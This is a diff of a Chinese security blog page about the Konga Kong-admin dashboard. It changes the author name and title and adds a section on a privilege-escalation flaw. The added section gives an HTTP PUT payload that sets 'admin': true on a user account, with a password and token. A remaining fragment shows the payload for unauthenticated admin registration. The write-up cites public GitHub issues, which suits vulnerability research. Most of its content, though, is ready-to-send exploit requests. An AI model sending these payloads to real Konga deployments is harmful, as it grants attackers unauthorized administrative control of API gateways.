@@ -15,9 +15,9 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="description" content="">
-  <meta name="author" content="L1k0r">
+  <meta name="author" content="L1e">
   <meta name="keywords" content="">
-  <title>Konga Unauthorized registration - L1k0r&#39;s Blog</title>
+  <title>Konga 漏洞 - L1e&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -50,7 +50,7 @@
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
-       href="/">&nbsp;<strong>L1k0r</strong>&nbsp;</a>
+       href="/">&nbsp;<strong>L1e</strong>&nbsp;</a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
             data-target="#navbarSupportedContent"
@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    173 字
+                    276 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    3
+                    4
                      分钟
                   </span>
                 
@@ -182,12 +182,30 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h1 id="Konga-Unauthorized-registration"><a href="#Konga-Unauthorized-registration" class="headerlink" title="Konga Unauthorized registration"></a>Konga Unauthorized registration</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>Konga不是官方应用。与Kong没有联系。<br>官方：<a href="https://github.com/pantsel/konga" target="_blank" rel="noopener">https://github.com/pantsel/konga</a></p>
+              <h1 id="Konga-漏洞"><a href="#Konga-漏洞" class="headerlink" title="Konga 漏洞"></a>Konga 漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>github：<a href="https://github.com/pantsel/konga" target="_blank" rel="noopener">https://github.com/pantsel/konga</a></p>
 </blockquote>
 <p><img src="https://l1e.oss-cn-beijing.aliyuncs.com/img/20200527163248.png" srcset="/img/loading.gif" alt=""></p>
-<h2 id="后台任意管理员注册"><a href="#后台任意管理员注册" class="headerlink" title="后台任意管理员注册"></a>后台任意管理员注册</h2><blockquote>
-<p>默认开放注册<br>直接发送请求即可</p>
+<h2 id="越权漏洞普通用户提升管理用户"><a href="#越权漏洞普通用户提升管理用户" class="headerlink" title="越权漏洞普通用户提升管理用户"></a>越权漏洞普通用户提升管理用户</h2><blockquote>
+<p>利用条件：需账号一枚<br>links：<br><a href="https://github.com/pantsel/konga/issues/695" target="_blank" rel="noopener">https://github.com/pantsel/konga/issues/695</a><br><a href="https://github.com/pantsel/konga/issues/694" target="_blank" rel="noopener">https://github.com/pantsel/konga/issues/694</a>  </p>
+</blockquote>
+<p><strong>Payload</strong></p>
+<pre><code class="hljs plain">PUT &#x2F;api&#x2F;user&#x2F;21 HTTP&#x2F;1.1
+Host: test.konga.oa.com
+Content-Type: application&#x2F;json;charset&#x3D;utf-8 Content-Length: 226
+&#123;
+    &quot;admin&quot;: true,
+    &quot;passports&quot;: &#123;
+        &quot;password&quot;: &quot;1234@abcd!&quot;,
+        &quot;protocol&quot;: &quot;local&quot;
+    &#125;,
+    &quot;password_confirmation&quot;: &quot;1234@abcd!&quot;,
+    &quot;token&quot;: &quot;eyJhbGciOiJIUzI1NiJ9.MjE.JSGF5Y5dU6zBaCkGaHQFjKlsTCXkf9_kfxiDSIMF6LI&quot;
+&#125;</code></pre>
+
+
+<h2 id="前台注册管理员用户"><a href="#前台注册管理员用户" class="headerlink" title="前台注册管理员用户"></a>前台注册管理员用户</h2><blockquote>
+<p>利用条件：默认开放注册，直接发送请求即可<br>links: <a href="https://github.com/pantsel/konga/issues/555" target="_blank" rel="noopener">https://github.com/pantsel/konga/issues/555</a></p>
 </blockquote>
 <p><img src="https://l1e.oss-cn-beijing.aliyuncs.com/img/20200527214601.jpg" srcset="/img/loading.gif" alt=""></p>
 <p><strong>Payload</strong> ：</p>
@@ -207,6 +225,8 @@ Accept-Language: zh-CN,zh;q&#x3D;0.9
 Content-Length: 106
 
 &#123;&quot;username&quot;:&quot;admintest&quot;,&quot;email&quot;:&quot;testa@qq.com&quot;,&quot;password&quot;:&quot;qqAAwiqk1&quot;,&quot;password_confirmation&quot;:&quot;qqAAwiqk1&quot;&#125;</code></pre>
+
+
 
             </article>
             <hr>
@@ -372,7 +392,7 @@ Content-Length: 106
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Konga Unauthorized registration&nbsp;",
+        "Konga 漏洞&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
